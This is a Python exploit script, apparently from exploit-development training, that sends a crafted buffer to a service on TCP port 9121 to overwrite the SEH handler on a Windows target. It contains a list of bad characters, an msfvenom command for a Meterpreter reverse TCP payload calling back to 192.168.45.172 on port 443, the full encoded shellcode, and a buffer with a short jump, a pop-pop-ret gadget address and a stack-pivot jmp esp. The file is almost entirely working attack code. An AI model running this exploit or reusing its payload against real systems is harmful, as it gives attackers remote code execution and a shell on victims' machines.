#!/usr/bin/python
import socket
import sys
from struct import pack

try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  # badchars found: 
  # \x00
  # \x02
  # \x0a
  # \x0d

  # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.172 LPORT=443 -b "\x00\x02\x0a\x0d" -f python -v shellcode

  shellcode = b"\x90" * 18
  shellcode +=  b""
  shellcode += b"\xbb\xaa\x70\xf8\xf4\xdd\xc3\xd9\x74\x24\xf4"
  shellcode += b"\x5a\x31\xc9\xb1\x59\x31\x5a\x14\x83\xc2\x04"
  shellcode += b"\x03\x5a\x10\x48\x85\x04\x1c\x03\x66\xf5\xdd"
  shellcode += b"\x7b\x56\x27\xb9\xf0\xca\xf7\xcb\xe3\x60\xa5"
  shellcode += b"\xc7\x60\x24\x5e\xd7\xc1\x83\x78\xd6\xd2\x9f"
  shellcode += b"\xf7\x30\x1d\x60\x5b\x7c\x3c\x1c\xa6\x51\x9e"
  shellcode += b"\x1d\x69\xa4\xdf\x5a\x3f\xc2\x30\x36\x4b\x7e"
  shellcode += b"\xde\xe0\xc0\x3d\xe2\x0f\x07\x4a\x5a\x68\x22"
  shellcode += b"\x8d\x2e\xc4\x2d\xde\x45\x9c\x35\x8e\xd2\x45"
  shellcode += b"\x66\x2f\x37\xf0\xaf\x5b\x8b\xca\xd0\xed\x78"
  shellcode += b"\x18\xa4\xef\xa8\x50\x7a\x43\x95\x5c\x77\x9d"
  shellcode += b"\xd2\x5b\x68\xe8\x28\x98\x15\xeb\xeb\xe2\xc1"
  shellcode += b"\x7e\xeb\x45\x81\xd9\xcf\x74\x46\xbf\x84\x7b"
  shellcode += b"\x23\xcb\xc2\x9f\xb2\x18\x79\x9b\x3f\x9f\xad"
  shellcode += b"\x2d\x7b\x84\x69\x75\xdf\xa5\x28\xd3\x8e\xda"
  shellcode += b"\x2a\xbb\x6f\x7f\x21\x2e\x79\xff\xca\xb0\x86"
  shellcode += b"\x5d\x5c\x7c\x4b\x5e\x9c\xea\xdc\x2d\xae\xb5"
  shellcode += b"\x76\xba\x82\x3e\x51\x3d\x93\x29\x62\x91\x1b"
  shellcode += b"\x39\x9c\x12\x5b\x13\x5b\x46\x0b\x0b\x4a\xe7"
  shellcode += b"\xc0\xcb\x73\x32\x7c\xc6\xe3\x7d\x28\xfb\x5f"
  shellcode += b"\x15\x2a\x04\xa1\x5d\xa3\xe2\xf1\xf1\xe3\xba"
  shellcode += b"\xb1\xa1\x43\x6b\x5a\xa8\x4c\x54\x7a\xd3\x87"
  shellcode += b"\xfd\x11\x3c\x71\x55\x8e\xa5\xd8\x2d\x2f\x29"
  shellcode += b"\xf7\x4b\x6f\xa1\xfd\xac\x3e\x42\x74\xbf\x57"
  shellcode += b"\x35\x76\x3f\xa8\xd0\x76\x55\xac\x72\x21\xc1"
  shellcode += b"\xae\xa3\x05\x4e\x50\x86\x16\x89\xae\x57\x2e"
  shellcode += b"\xe1\x99\xcd\x0e\x9d\xe5\x01\x8e\x5d\xb0\x4b"
  shellcode += b"\x8e\x35\x64\x28\xdd\x20\x6b\xe5\x72\xf9\xfe"
  shellcode += b"\x06\x22\xad\xa9\x6e\xc8\x88\x9e\x30\x33\xff"
  shellcode += b"\x9c\x37\xcb\x7d\x8b\x9f\xa3\x7d\x8b\x1f\x33"
  shellcode += b"\x14\x0b\x70\x5b\xe3\x24\x7f\xab\x0c\xef\x28"
  shellcode += b"\xa3\x87\x7e\x9a\x52\x97\xaa\x7a\xca\x98\x59"
  shellcode += b"\xa7\xfd\xe3\x12\x58\xfe\x13\x3b\x3d\xff\x13"
  shellcode += b"\x43\x43\x3c\xc2\x7a\x31\x03\xd6\x38\x4a\x36"
  shellcode += b"\x7b\x68\xc1\x38\x2f\x6a\xc0"
  shellcode += b"\x43" * (400 - len(shellcode))

  inputBuffer = b"\x41" * 124
  inputBuffer += pack("<L", (0x06eb9090))	# (NSEH)
  inputBuffer += pack("<L", (0x1015a2f0))	# SEH 0x1015a2f0 - pop eax, pop ebx, ret
  inputBuffer += b"\x90" * 2
  inputBuffer += b"\x66\x81\xC4\x30\x08"	# 0x6681C43008 - add sp, 0x830
  inputBuffer += b"\xff\xe4" 			# jmp esp
  inputBuffer += b"\x90" * (size - len(inputBuffer) - len(shellcode))
  inputBuffer += shellcode
  
  header =  b"\x75\x19\xba\xab"
  header += b"\x03\x00\x00\x00"
  header += b"\x00\x40\x00\x00"
  header += pack('<I', len(inputBuffer))
  header += pack('<I', len(inputBuffer))
  header += pack('<I', inputBuffer[-1])

  buf = header + inputBuffer 

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buf)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")
